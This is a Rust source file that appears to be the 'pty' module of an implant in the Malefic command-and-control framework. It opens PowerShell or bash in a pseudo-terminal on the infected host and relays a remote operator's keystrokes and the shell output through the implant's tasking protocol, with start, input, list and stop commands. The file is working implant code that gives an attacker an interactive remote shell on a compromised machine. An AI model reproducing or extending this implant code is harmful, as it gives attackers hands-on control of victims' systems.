use async_trait::async_trait;
use malefic_trait::module_impl;
use futures_timer::Delay;
use std::io::{Read, Write};
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::modulepb::{PtyRequest, PtyResponse};
use portable_pty::{CommandBuilder, PtySize, native_pty_system, Child};
use std::sync::{Arc, Mutex, mpsc::{self, Sender, Receiver}};
use std::time::Duration;
use std::collections::HashMap;
use std::thread;
use lazy_static::lazy_static;
use crate::prelude::*;

// PTY session manager
lazy_static::lazy_static! {
    static ref PTY_SESSIONS: Arc<Mutex<HashMap<String, PtySession>>> = Arc::new(Mutex::new(HashMap::new()));
}

pub struct Pty {}

#[derive(Debug)]
enum OutputData {
    Stdout(Vec<u8>),
    Error(String),
    Close,
}

pub struct PtySession {
    pub input_sender: Sender<Vec<u8>>,
    pub output_receiver: Arc<Mutex<Receiver<OutputData>>>,
    pub session_id: String,
    pub active: Arc<Mutex<bool>>,
    pub child: Arc<Mutex<Box<dyn Child + Send + Sync>>>,
    pub master: Arc<Mutex<Box<dyn portable_pty::MasterPty + Send>>>,
}

impl std::fmt::Debug for PtySession {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("PtySession")
            .field("session_id", &self.session_id)
            .finish()
    }
}

// 简化的错误响应构造器
impl Pty {
    fn error_response(id: u32, session_id: &str, error: String, active: bool) -> ModuleResult {
        let response = PtyResponse {
            session_id: session_id.to_string(),
            output_text: String::new(),
            error,
            session_active: active,
            active_sessions: Vec::new(),
            ..Default::default()
        };
        Ok(TaskResult::new_with_body(id, Body::PtyResponse(response)))
    }

    fn success_response(id: u32, session_id: &str, output: String, active: bool, metadata: HashMap<String, String>) -> ModuleResult {
        let response = PtyResponse {
            session_id: session_id.to_string(),
            output_text: output.clone(),
            output_data: output.as_bytes().to_vec(),
            error: String::new(),
            session_active: active,
            active_sessions: Vec::new(),
            metadata,
            ..Default::default()
        };
        Ok(TaskResult::new_with_body(id, Body::PtyResponse(response)))
    }

    // 检查会话状态的统一方法
    fn check_session_status(session_id: &str) -> Result<bool, String> {
        let sessions = PTY_SESSIONS.lock().unwrap();
        let session = sessions.get(session_id)
            .ok_or_else(|| format!("PTY session {} does not exist", session_id))?;

        let active = session.active.try_lock()
            .map(|guard| *guard)
            .unwrap_or(true);

        if !active {
            return Err(format!("PTY session {} is no longer active", session_id));
        }

        // 检查子进程状态
        if let Ok(mut child_guard) = session.child.try_lock() {
            if let Ok(Some(exit_status)) = child_guard.try_wait() {
                return Err(format!("Shell process has exited with status: {:?}", exit_status));
            }
        }

        Ok(active)
    }

    // 获取会话的输入发送器和输出接收器
    fn get_session_channels(session_id: &str) -> Result<(Sender<Vec<u8>>, Arc<Mutex<Receiver<OutputData>>>), String> {
        let sessions = PTY_SESSIONS.lock().unwrap();
        let session = sessions.get(session_id)
            .ok_or_else(|| format!("PTY session {} does not exist", session_id))?;

        Ok((session.input_sender.clone(), session.output_receiver.clone()))
    }

    // 获取默认shell - 固定PowerShell路径
    fn get_default_shell(requested_shell: &str) -> String {
        if cfg!(windows) {
            if requested_shell.is_empty() || matches!(requested_shell, "pwsh" | "powershell" | "powershell.exe") {
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string()
            } else {
                requested_shell.to_string()
            }
        } else {
            if requested_shell.is_empty() {
                "/bin/bash".to_string()
            } else {
                requested_shell.to_string()
            }
        }
    }

    // 简化的prompt提取
    fn extract_simple_prompt(output: &str) -> Option<String> {
        for line in output.lines().rev() {
            let trimmed = line.trim();
            if trimmed.is_empty() { continue; }

            if let Some(last_char) = trimmed.chars().last() {
                if matches!(last_char, '>' | '$' | '#' | '❯') {
                    return Some(trimmed.to_string());
                }
            }
        }
        None
    }

    // 移除末尾prompt行
    fn remove_trailing_prompt(text: &str) -> (String, Option<String>) {
        if let Some(prompt) = Self::extract_simple_prompt(text) {
            if let Some(last_newline) = text.trim_end().rfind('\n') {
                return (text[..last_newline + 1].to_string(), Some(prompt));
            }
        }
        (text.to_string(), None)
    }

    // 移除输入回显
    fn remove_input_echo(output_data: &[u8], input_data: &[u8]) -> Vec<u8> {
        let output_str = String::from_utf8_lossy(output_data);
        let input_str = String::from_utf8_lossy(input_data);

        if output_str.starts_with(&*input_str) {
            output_data[input_data.len()..].to_vec()
        } else {
            output_data.to_vec()
        }
    }


}

// PTY I/O 处理函数
fn read_pty(mut reader: Box<dyn Read + Send>, sender: Sender<OutputData>, session_id: String) {
    let mut buf = vec![0; 4096];
    loop {
        match reader.read(&mut buf) {
            Ok(0) => {
                let _ = sender.send(OutputData::Close);
                break;
            }
            Ok(n) => {
                if sender.send(OutputData::Stdout(buf[..n].to_vec())).is_err() {
                    break;
                }
            }
            Err(e) => {
                let _ = sender.send(OutputData::Error(format!("PTY read error: {}", e)));
                break;
            }
        }
    }
}

fn write_pty(
    mut writer: Box<dyn Write + Send>,
    receiver: Receiver<Vec<u8>>,
    _session_id: String,
    active: Arc<Mutex<bool>>,
    child: Arc<Mutex<Box<dyn Child + Send + Sync>>>
) {
    while let Ok(data) = receiver.recv() {
        // 检查会话状态
        if let Ok(is_active) = active.try_lock() {
            if !*is_active { break; }
        }

        // 检查子进程状态
        if let Ok(mut child_guard) = child.try_lock() {
            if let Ok(Some(_)) = child_guard.try_wait() {
                if let Ok(mut is_active) = active.try_lock() {
                    *is_active = false;
                }
                break;
            }
        }

        if writer.write_all(&data).is_err() || writer.flush().is_err() {
            break;
        }
    }
}

#[async_trait]
#[module_impl("pty")]
impl Module for Pty {}

#[async_trait]
impl ModuleImpl for Pty {
    async fn run(&mut self, id: u32, receiver: &mut Input, sender: &mut Output) -> ModuleResult {
        let request = check_request!(receiver, Body::PtyRequest)?;

        match request.r#type.as_str() {
            "start" => self.start_session(id, &request).await,
            "input" => self.send_input(id, &request).await,
            "resize" => self.resize_session(id, &request).await,
            "stop" => self.stop_session(id, &request).await,
            "list" => self.list_sessions(id).await,
            _ => Self::error_response(id, "",
                                      format!("Unknown PTY command: {}. Supported: start, input, resize, stop, list", request.r#type),
                                      false)
        }
    }
}

impl Pty {
    async fn start_session(&mut self, id: u32, request: &PtyRequest) -> ModuleResult {
        let session_id = if request.session_id.is_empty() {
            format!("pty_{}", id)
        } else {
            request.session_id.clone()
        };

        // 检查会话是否已存在
        {
            let sessions = PTY_SESSIONS.lock().unwrap();
            if sessions.contains_key(&session_id) {
                return Self::error_response(id, &session_id,
                                            format!("PTY session {} already exists", session_id), true);
            }
        }

        // 创建PTY
        let pty_system = native_pty_system();
        let cols = if request.cols > 0 { request.cols } else { 80 };
        let rows = if request.rows > 0 { request.rows } else { 24 };

        let pair = pty_system.openpty(PtySize {
            rows: rows as u16,
            cols: cols as u16,
            pixel_width: 0,
            pixel_height: 0,
        }).map_err(|e| anyhow::anyhow!("Failed to create PTY: {}", e))?;

        // 启动shell
        let shell = Self::get_default_shell(&request.shell);
        let mut cmd = CommandBuilder::new(&shell);

        if cfg!(windows) && shell.contains("powershell") {
            cmd.arg("-NoLogo");
        }

        cmd.env("TERM", "xterm-256color");

        let child = pair.slave.spawn_command(cmd)
            .map_err(|e| anyhow::anyhow!("Failed to start shell: {}", e))?;

        // 设置I/O管道
        let reader = pair.master.try_clone_reader()
            .map_err(|e| anyhow::anyhow!("Failed to clone reader: {}", e))?;
        let writer = pair.master.take_writer()
            .map_err(|e| anyhow::anyhow!("Failed to get writer: {}", e))?;

        let (output_tx, output_rx) = mpsc::channel();
        let (input_tx, input_rx) = mpsc::channel();

        let active = Arc::new(Mutex::new(true));
        let child_ref = Arc::new(Mutex::new(child));
        let master_ref = Arc::new(Mutex::new(pair.master));

        // 启动I/O线程
        let reader_session_id = session_id.clone();
        thread::spawn(move || read_pty(reader, output_tx, reader_session_id));

        let writer_session_id = session_id.clone();
        let writer_active = active.clone();
        let writer_child = child_ref.clone();
        thread::spawn(move || write_pty(writer, input_rx, writer_session_id, writer_active, writer_child));

        // 存储会话
        {
            let mut sessions = PTY_SESSIONS.lock().unwrap();
            sessions.insert(session_id.clone(), PtySession {
                input_sender: input_tx,
                output_receiver: Arc::new(Mutex::new(output_rx)),
                session_id: session_id.clone(),
                active,
                child: child_ref,
                master: master_ref,

            });
        }

        // 等待初始化并收集初始输出
        Delay::new(Duration::from_millis(500)).await;

        let mut initial_output = Vec::new();
        if let Ok(sessions) = PTY_SESSIONS.lock() {
            if let Some(session) = sessions.get(&session_id) {
                if let Ok(receiver) = session.output_receiver.try_lock() {
                    while let Ok(data) = receiver.try_recv() {
                        if let OutputData::Stdout(bytes) = data {
                            initial_output.extend_from_slice(&bytes);
                        }
                    }
                }
            }
        }

        let output_text = if initial_output.is_empty() {
            format!("PTY session started: {} (using {})", session_id, shell)
        } else {
            String::from_utf8_lossy(&initial_output).to_string()
        };

        let (output_text, prompt) = Self::remove_trailing_prompt(&output_text);
        let mut metadata = HashMap::new();
        if let Some(p) = prompt {
            metadata.insert("prompt".to_string(), p);
        }
        metadata.insert("shell".to_string(), shell);

        Self::success_response(id, &session_id, output_text, true, metadata)
    }

    async fn send_input(&mut self, id: u32, request: &PtyRequest) -> ModuleResult {
        let session_id = &request.session_id;
        if session_id.is_empty() {
            return Self::error_response(id, "", "Missing session_id parameter".to_string(), false);
        }

        // 检查会话状态
        let _active = match Self::check_session_status(session_id) {
            Ok(active) => active,
            Err(error) => return Self::error_response(id, session_id, error, false),
        };

        // 获取会话通道
        let (input_sender, output_receiver) = match Self::get_session_channels(session_id) {
            Ok(channels) => channels,
            Err(error) => return Self::error_response(id, session_id, error, false),
        };

        // 处理输入数据
        let input_data = if !request.input_data.is_empty() {
            request.input_data.clone()
        } else {
            request.input_text.as_bytes().to_vec()
        };

        // 简化的清理策略：除了特殊导航键，其他输入都清理
        let is_special_key = matches!(&input_data[..],
            [27, 91, 65] | // 上方向键
            [27, 91, 66] | // 下方向键
            [27, 91, 67] | // 右方向键
            [27, 91, 68] | // 左方向键
            [9]            // Tab键
        );

        if !is_special_key {
            let _ = input_sender.send(vec![3]); // Ctrl+C
            Delay::new(Duration::from_millis(200)).await;

            // 清空缓冲区
            if let Ok(receiver) = output_receiver.try_lock() {
                while receiver.try_recv().is_ok() {}
            }
        }

        // 发送实际输入
        if let Err(_) = input_sender.send(input_data.clone()) {
            return Self::error_response(id, session_id,
                                        "Failed to send input - session may be closed".to_string(), false);
        }

        // 等待输出，简化的超时逻辑
        let mut output_data = Vec::new();
        for _ in 0..50 { // 5秒超时
            Delay::new(Duration::from_millis(100)).await;

            if let Ok(receiver) = output_receiver.try_lock() {
                while let Ok(OutputData::Stdout(bytes)) = receiver.try_recv() {
                    output_data.extend_from_slice(&bytes);
                }
            }

            // 检查prompt出现（命令完成）
            if !output_data.is_empty() {
                let output_str = String::from_utf8_lossy(&output_data);
                if output_str.chars().any(|c| matches!(c, '❯' | '$' | '>' | '#')) {
                    break;
                }
            }
        }

        // 移除输入回显
        let cleaned_output = Self::remove_input_echo(&output_data, &input_data);

        let output_text = String::from_utf8_lossy(&cleaned_output).to_string();
        let (output_text, prompt) = Self::remove_trailing_prompt(&output_text);

        let mut metadata = HashMap::new();
        if let Some(p) = prompt {
            metadata.insert("prompt".to_string(), p);
        }

        Self::success_response(id, session_id, output_text, true, metadata)
    }

    async fn resize_session(&mut self, id: u32, request: &PtyRequest) -> ModuleResult {
        let session_id = &request.session_id;
        if session_id.is_empty() {
            return Self::error_response(id, "", "Missing session_id parameter".to_string(), false);
        }

        let cols = if request.cols > 0 { request.cols } else { 80 };
        let rows = if request.rows > 0 { request.rows } else { 24 };

        // TODO: 实现实际的resize逻辑
        Self::success_response(id, session_id,
                               format!("Resize request: {}x{} (implementation needed)", cols, rows),
                               true, HashMap::new())
    }

    async fn stop_session(&mut self, id: u32, request: &PtyRequest) -> ModuleResult {
        let session_id = &request.session_id;
        if session_id.is_empty() {
            return Self::error_response(id, "", "Missing session_id parameter".to_string(), false);
        }

        let _removed = {
            let mut sessions = PTY_SESSIONS.lock().unwrap();
            if let Some(session) = sessions.get(session_id) {
                // 标记为非活跃
                if let Ok(mut active) = session.active.try_lock() {
                    *active = false;
                }

                // 终止子进程
                if let Ok(mut child_guard) = session.child.try_lock() {
                    if let Ok(None) = child_guard.try_wait() {
                        let _ = child_guard.kill();
                    }
                }
            }
            sessions.remove(session_id).is_some()
        };

        Self::success_response(id, session_id, "Session exited".to_string(), false, HashMap::new())
    }

    async fn list_sessions(&mut self, id: u32) -> ModuleResult {
        let (sessions_info, active_sessions) = {
            let sessions = PTY_SESSIONS.lock().unwrap();
            if sessions.is_empty() {
                ("No active PTY sessions".to_string(), Vec::new())
            } else {
                let mut info = format!("Active PTY sessions ({} total):\n", sessions.len());
                let mut active_list = Vec::new();

                for (session_id, session) in sessions.iter() {
                    let is_active = session.active.try_lock()
                        .map(|guard| *guard)
                        .unwrap_or(true);

                    info.push_str(&format!("- {} (active: {})\n", session_id, is_active));
                    if is_active {
                        active_list.push(session_id.clone());
                    }
                }
                (info, active_list)
            }
        };

        let response = PtyResponse {
            session_id: String::new(),
            output_text: sessions_info,
            error: String::new(),
            session_active: true,
            active_sessions,
            ..Default::default()
        };
        Ok(TaskResult::new_with_body(id, Body::PtyResponse(response)))
    }
}
